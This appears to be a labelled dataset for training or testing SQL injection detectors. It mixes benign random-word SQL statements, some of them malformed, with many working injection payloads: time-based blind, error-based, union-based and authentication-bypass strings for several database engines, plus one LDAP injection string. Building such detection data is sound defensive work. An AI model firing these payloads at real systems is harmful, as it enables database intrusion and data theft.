(  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   ||';1
SELECT hurryID AS ID, modern AS broke FROM stage;0
1'  )   where 1027  =  1027 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --;1
SELECT * FROM noun WHERE NOT rod = 'younger'  AND NOT for = 'balance';0
select * from users where id  =  '1' or @ 1  =  1 union select 1,version  (    )   -- 1';1
1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'xgzb'  =  'xgzb;1
1  )   union all select null,null,null,null#;1
SELECT * FROM would FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM catch;0
SELECT * FROM gather WHERE watch BETWEEN '1996-07-01' AND '1996-07-31';0
"1%"" and   (  3020  =  3020  )  *6703 and ""%""  =  """;1
"-3501""   )    )     )   or   (  6789  =  6990  )  *6990 and    (    (     (  ""jnnc"" like ""jnnc";1
"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""imlx""  =  ""imlx";1
"-5132%""   )    )    or 3038  =  3038";1
SELECT * FROM hung WHERE that = 'immediately'  OR find = 'search';0
select * from users where id  =  1 or $ 1  =  1 union select 1,@@VERSION -- 1;1
group by userid having 1  =  1--;1
"SELECT user_id, price FROM customers WHERE email = 'john@example.com';";0
" select sleep  (  5  )   and    (    (     (  ""%""  =  """;1
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #";1
or sleep  (  __TIME__  )    =  ';1
"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#";1
1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'jiyx'  =  'jiyx;1
-9854  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  5696  =  5696;1
SELECT * FROM held WHERE continued = 'balloon'  AND  ( imagine = 'many' OR furniture = 'badly' ) ;0
select case when 3661  =  9315 then 1 else null end--;1
"1""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""cdnc"" like ""cdnc";1
SELECT * FROM structure WHERE brought BETWEEN '1996-07-01' AND '1996-07-31';0
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4;1
""" or """"^""";1
"1%""  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""%""  =  """;1
"1""  )   as lkzz where 3565  =  3565 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --";1
1' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'aezm' like 'aezm;1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""vzft""  =  ""vzft";1
1  )   where 7729  =  7729;1
1 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ;1
1'   )    )    as vdhw where 8858  =  8858 order by 1#;1
1 where 8114  =  8114 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --;1
select * from users where id  =  '1' +   (    )   union select 1,@@VERSION -- 1';1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--;1
"SELECT description FROM customers WHERE status = 'pending';";0
1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ;1
SELECT AVG ( excited ) FROM industry SELECT SUM ( mouse ) ;0
"INSERT INTO customers (quantity, name) VALUES ('Sample text', 'user123');";0
SELECT * FROM shirt  WHERE occasionally NOT LIKE '[clothing]%';0
"INSERT INTO logs (quantity, email, description, user_id) VALUES ('active', 'pending', 'Sample text', 'user123');";0
SELECT * FROM income WHERE chapter = 'distant'  AND City = 'pleasant';0
INSERT INTO balance  ( meant, gravity, daily )  VALUES  ( 'let', 'soldier', 'chief' )  ;0
SELECT * FROM job FETCH FIRST 3 ROWS ONLY;0
"DELETE FROM sessions WHERE status = 'user123';";0
" )    )   ;waitfor delay '0:0:__TIME__'--";1
SELECT jump ( s )  FROM passage LEFT JOIN;0
or 0  =  0 --;1
""" """;1
"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --";1
1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --;1
"sqlvuln;";1
SELECT * FROM shop WHERE greatest IN  ( 'tomorrow', 'stay', 'plane' )  ;0
SELECT DISTINCT year FROM ground;0
"INSERT INTO orders (quantity, name, description, price) VALUES ('Sample text', 'pending', 'Sample text', '2023-01-01');";0
select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1;1
1'  )   or sleep  (  5  ) ;1
1'   )    )    as uuuk where 7234  =  7234 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --;1
"'));waitfor delay '0:0:5'--";1
1'   )    )    as arhm where 3268  =  3268 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --;1
"DELETE FROM users WHERE quantity = 123;";0
" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1";1
SELECT DISTINCT chicken FROM traffic;0
1 where 4787  =  4787;1
(  select   (  case when   (  6581  =  6581  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ;1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--;1
-4108'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'tqjx'  =  'tqjx;1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#;1
1'||  (  select 'bpml' where 7360  =  7360 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||';1
1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'ofko'  =  'ofko;1
SELECT dangerous,pretty FROM freedom WHERE loud = 'badly' UNION SELECT apartment, office FROM light;0
-4023 or   (  8779  =  5716  )  *5716;1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--;1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))--;1
SELECT * FROM  ( SELECT fuel FROM citizen ) ;0
1%'   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '%'  =  ';1
1   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  1748  =  1748;1
"UPDATE orders SET price = 'pending' WHERE name = 'user123';";0
"1%""   )    )    union all select null,null,null,null,null,null,null,null,null#";1
1',  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ;1
1%'   )    )     )   union all select null,null,null,null#;1
-1676'||  (  select 'xzmu' from dual where 6373  =  6373 union all select 6373,6373--;1
ORDER BY 8;1
admin' --;1
SELECT * FROM neck WHERE when = 'how' FETCH FIRST 3 ROWS ONLY;0
1'   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'swjk'  =  'swjk;1
"SELECT quantity, email, created_at, status FROM employees WHERE email = 'active';";0
SELECT * FROM outline WHERE    NOT division = 'loose';0
"1""  )   where 9447  =  9447";1
SELECT * FROM simply FETCH FIRST 3 ROWS ONLY;0
SELECT * FROM flew WHERE flame NOT LIKE 'of%';0
1'+  (  select 'bmit' where 3716  =  3716 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   +';1
"1""  )   as kndn where 9314  =  9314";1
"-7233""  )   where 7574  =  7574 or 5821  =  3288";1
"UPDATE inventory SET description = '2023-01-01' WHERE description = 'pending';";0
-3578'   )    )     )   order by 1--;1
-4323'   )    )    or 6968  =  1393;1
"SELECT name FROM logs WHERE description = 'user123';";0
SELECT * FROM left WHERE form  BETWEEN 10 AND 20;0
iif  (  1157  =  4542,1,1/0  )  ;1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""zzmn""  =  ""zzmn";1
1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'cgbf' like 'cgbf;1
"SELECT id, description FROM products WHERE user_id = 'Sample text';";0
ORDER BY 28#;1
-7962'   )    )    as pgqz where 6058  =  6058 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --;1
SELECT COUNT ( select ) , easy FROM satellites BY gray;0
"UPDATE inventory SET description = 456 WHERE price = 'pending';";0
SELECT DISTINCT bare FROM fun;0
-8364'  )   union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#;1
SELECT TOP 3 * FROM house WHERE naturally = 'area';0
1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #;1
1' or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
1'||  (  select 'uiyj' from dual where 8320  =  8320;1
"1""  )   where 4822  =  4822 union all select null,null,null,null,null,null,null,null,null,null--";1
SELECT COUNT ( top ) FROM model;0
SELECT * FROM search FETCH FIRST 3 ROWS ONLY;0
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'eqfh'  =  'eqfh;1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#;1
SELECT below ( s )  FROM dear UNION;0
1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #;1
SELECT Employees.drawn, COUNT ( Orders.drivingID )  AS beenFROM    ( OrdersINNER JOIN with ON Orders.brainID  =  Employees.communityID ) ;0
"DELETE FROM customers WHERE created_at = 'john@example.com';";0
-5555   )    )    as ldte where 4583  =  4583 order by 1#;1
1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   # fmxq;1
" select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1";1
SELECT * FROM put  WHERE yet = exchange;0
ORDER BY 13--;1
select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  '%'  =  ';1
1%' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  ';1
admin' or '1'='1'--;1
or benchmark(50000000,MD5(1));1
SELECT * FROM order WHERE running BETWEEN '1996-07-01' AND '1996-07-31';0
1  )   as qjbd where 2808  =  2808   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --;1
SELECT somebody,sell FROM smaller WHERE ride = 'want' UNION SELECT held, during FROM gather;0
"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ";1
"INSERT INTO sessions (created_at, user_id) VALUES ('pending', 'pending');";0
select * from users where id  =  1 *  (    )   union select null,@@VERSION -- 1;1
"DELETE FROM employees WHERE status = '2023-01-01';";0
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--;1
SELECT * FROM buffalo WHERE Price NOT BETWEEN 10 AND 20;0
"1"" where 3510  =  3510";1
" select * from users where id  =  1 or ""  (  &"" or 1  =  1 -- 1";1
"-5187""  )   union all select 3373,3373#";1
SELECT say,grade,wise,engine,post     (  (  arrangement JOIN date ON bright.known =  fish.writing )   INNER JOIN teamON Orders.even =  tune.morningID ) ;0
1  )   and 8417  =  5276#;1
"DELETE FROM employees WHERE name = 123;";0
"1""  )   where 9861  =  9861";1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23;1
select * from users where id  =  1 union select 1<@,version  (    )   -- 1;1
1'   )    )    as ypgz where 8704  =  8704;1
select   (  case when   (  3855  =  3855  )   then 3855 else 1/  (  select 0  )   end  )  --;1
1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'njge' like 'njge;1
SELECT AVG ( hat ) FROM money SELECT SUM ( zebra ) ;0
select   (  case when   (  9619  =  8679  )   then 1 else 9619*  (  select 9619 from master..sysdatabases  )   end  )  --;1
-2377%'   )    )     )   union all select 7706,7706--;1
"admin""or 1=1 or """"=""";1
1'  )   as wpom where 2620  =  2620 and elt  (  3114  =  3114,sleep  (  5   )    )   #;1
1'   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --;1
SELECT TOP 3 * FROM keep SELECT * FROM nearby 3SELECT * FROM improve;0
UPDATE quick SET planning = 'under'WHERE another = 'of';0
union select;1
1',  (  select   (  case when   (  6894  =  6087  )   then 1 else 6894*  (  select 6894 from information_schema.character_sets  )   end   )    )   ;1
SELECT * FROM brush FETCH FIRST 50 PERCENT ROWS ONLY;0
1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin;1
1 and 6802  =  3592--;1
SELECT thinkID AS ID, dry AS him FROM finally;0
SELECT stood ( s )  FROM pipe UNION;0
1',  (  select   (  case when   (  1392  =  1380  )   then 1 else 1392*  (  select 1392 from master..sysdatabases  )   end   )    )   ;1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""lzyl"" like ""lzyl";1
SELECT Count ( * )  AS army;0
FROM  ( SELECT DISTINCT prepare FROM pond ) ;0
"-5439"" or 2559  =  4692 and ""dcrf"" like ""dcrf";1
SELECT * FROM tongue WHERE cook = 'idea' LIMIT 3;0
admin') or ('1'='1'--;1
1' in boolean mode  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14;1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#;1
SELECT TOP 3 * FROM tobacco;0
SELECT column_name ( s )  FROM no,former;0
declare @s varchar  (  200  )   select @s   =   0x77616974 ...;1
1'||  (  select 'jpow' from dual where 4381  =  4381 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||';1
SELECT young ( s ) FROM behavior INNER JOIN;0
-- &password  = ;1
if  (  9953  =  4347  )   select 9953 else drop function ocau--;1
"SELECT description, name, quantity, price FROM customers WHERE description = 'user123';";0
"DELETE FROM inventory WHERE email = 'active';";0
DELETE FROM scientific;0
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12--;1
1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --;1
"""a"""" or 1  =  1--""";1
-9225  )   or   (  8258  =  2726  )  *2726 and   (  9900  =  9900;1
"1"" and sleep  (  5  )   and ""tdid"" like ""tdid";1
-8409   )    )    as ipbz where 9984  =  9984 or 3371  =  3869;1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#;1
SELECT * FROM glass  WHERE sat = blanket;0
"1""  )   as crek where 6570  =  6570 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --";1
1' and sleep  (  5  )   and 'usgv' like 'usgv;1
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'";1
admin') or ('1'='1;1
1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'ejnt' like 'ejnt;1
SELECT AVG ( never ) FROM oxygen SELECT SUM ( foot ) ;0
SELECT MIN ( thrown )  AS poor FROM evening;0
1'  )   as yyyb where 1705  =  1705 and   (  8770  =  6988  )  *6988--;1
1'||  (  select 'xhcr' from dual where 9279  =  9279;1
or '1'  =  '1'--;1
select * from users where id  =  1 or $+< union select 1,@@VERSION -- 1;1
SELECT AVG ( favorite ) FROM softly;0
select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   '%'  =  ';1
SELECT * FROM everywhere ORDER BY imagine ASC, nodded DESC;0
Ã¢Â€Â˜ or 3  =  3 --;1
"1"" where 3692  =  3692 union all select null,null--";1
select * from users where id  =  1 or $< or 1  =  1 -- 1;1
1 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ;1
1'+  (  select 'czpg' where 6627  =  6627 and 2006  =  2006;1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5;1
"1"" rlike sleep  (  5  )  #";1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """;1
"INSERT INTO users (price, email) VALUES (456, 'pending');";0
"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #";1
(  sqlattempt2  ) ;1
" select * from users where id  =  1 or @#""{  =  1 union select 1,version  (    )   -- 1";1
"INSERT INTO orders (price, email, name, quantity) VALUES ('Sample text', 'Sample text', 'john@example.com', 'john@example.com');";0
"1""   )    )    as thoj where 1577  =  1577 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --";1
""" or ""a""  =  ""a";1
1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --;1
UPDATE hat SET fuel =  'meat', City =  'differ' WHERE signal =  root;0
1'||  (  select 'kuxp' where 7123  =  7123 and 1688  =  4200#;1
UPDATE riding SET piano = 'perfectly'WHERE peace = 'such';0
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#;1
select   (  case when   (  2676  =  4191  )   then 2676 else 1/  (  select 0  )   end  )  --;1
SELECT * FROM piece WHERE raw = 'wide'  AND  ( brass = 'hat' OR newspaper = 'understanding' ) ;0
SELECT * FROM smallest FETCH FIRST 50 PERCENT ROWS ONLY;0
UPDATE refused SET dance = 'job'WHERE worth = 'sister';0
*  (  |  (  objectclass  =  *   )    ) ;1
SELECT * FROM gold WHERE interest = 'television'  OR sang = 'average';0
SELECT * FROM everyone WHERE pond IN  ( SELECT either FROM average ) ;0
ORDER BY 1,SLEEP(5),3,4#;1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#;1
-6095'  )   or 6872  =  6872 and   (  'bfwm' like 'bfwm;1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--;1
"1%""  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #";1
-1512 union all select 9013,9013,9013,9013#;1
SELECT * FROM scientist WHERE old NOT LIKE 'form%';0
select case when 6229  =  2077 then 1 else null end--;1
ORDER BY 26#;1
1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#;1
SELECT AVG ( sign ) FROM check SELECT SUM ( large ) ;0
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq;1
"1""  )   as kbjt where 2012  =  2012 and   (  5978  =  6898  )  *6898--";1
1   )    )    as uqsi where 1644  =  1644 and 9198  =  9198--;1
"INSERT INTO employees (name, id, email) VALUES ('Sample text', 'Sample text', 'user123');";0
SELECT * FROM struggle  WHERE tea = forest;0
"SELECT email, quantity, id, created_at FROM customers WHERE status = 123;";0
SELECT invented ( s )  FROM rays UNION;0
-3613%'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  '%'  =  ';1
SELECT * FROM flow WHERE though = 'various'  AND  ( difficult = 'began' OR greatest = 'sentence' ) ;0
SELECT TOP 3 * FROM live SELECT * FROM dead 3SELECT * FROM road;0
"1"" where 5796  =  5796 and sleep  (  5  )  #";1
UPDATE wave SET load = 'speak'WHERE carry = 'probably';0
SELECT recordID AS ID, southern AS famous FROM rabbit;0
SELECT * FROM myself WHERE involved BETWEEN 'similar' AND 'luck';0
SELECT Employees.type, COUNT ( Orders.locationID )  AS comeFROM    ( OrdersINNER JOIN running ON Orders.talesID  =  Employees.herdID ) ;0
make_set  (  2672  =  2672,5440  )  ;1
"DELETE FROM users WHERE status = '2023-01-01';";0
insert;1
-8074'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'lnwm'  =  'lnwm;1
SELECT * FROM length WHERE NOT pen = 'none'  AND NOT case = 'powerful';0
"INSERT INTO logs (email, quantity) VALUES ('active', 'active');";0
1%'   )    )     )   union all select null,null--;1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#;1
SELECT * FROM poem  WHERE brush NOT LIKE '[furniture]%';0
ORDER BY 29#;1
1   )    )    as jfae where 6684  =  6684 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --;1
"SELECT price FROM employees WHERE user_id = '2023-01-01';";0
select * from users where id  =  1 <@$ or 1  =  1 -- 1;1
SELECT * FROM bottom WHERE clear = 'underline' LIMIT 3;0
1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ;1
SELECT river ( s )  FROM laugh SELECT combine FROM increase;0
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#;1
INSERT INTO party ( effect, share, system, wet, east, blood )  VALUES  ( 'eaten', 'canal'. wood', 'agree', 'dirty', 'tent', 'drink' )  ;0
SELECT Employees.report, COUNT ( Orders.withinID )  AS thingFROM    ( OrdersINNER JOIN cookies ON Orders.hunterID  =  Employees.shownID ) ;0
